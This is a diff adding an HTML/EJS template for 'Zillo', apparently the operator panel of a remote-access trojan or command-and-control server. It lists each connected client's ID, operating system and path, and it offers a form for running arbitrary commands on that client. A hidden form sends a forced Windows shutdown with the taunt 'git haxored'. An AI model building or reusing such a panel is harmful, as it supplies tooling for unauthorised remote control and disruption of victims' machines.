@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Zillo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="main.css">
+</head>
+<body>
+    <h1><a href="/">zillo</a></h1>
+    <h4>client: <%= client.name %></h4>
+
+    <div class="client">
+        <p>ID: <%= client.id %></p>
+        <p>OS: <%= client.os %></p>
+        <p>Path: <%= client.path %></p>
+    </div>
+
+    <h4>execute command</h4>
+    <form action="<%= client.id %>/exec" method="post">
+        <label for="cmd">command:</label>
+        <input type="text" id="cmd" name="cmd">
+        <input type="submit" value="Submit">
+    </form>
+
+    <h4>shutdown</h4>
+    <form action="<%= client.id %>/exec" method="post">
+        <input type="hidden" id="cmd" name="cmd" value='shutdown /s /t 5 /c "git haxored"'>
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
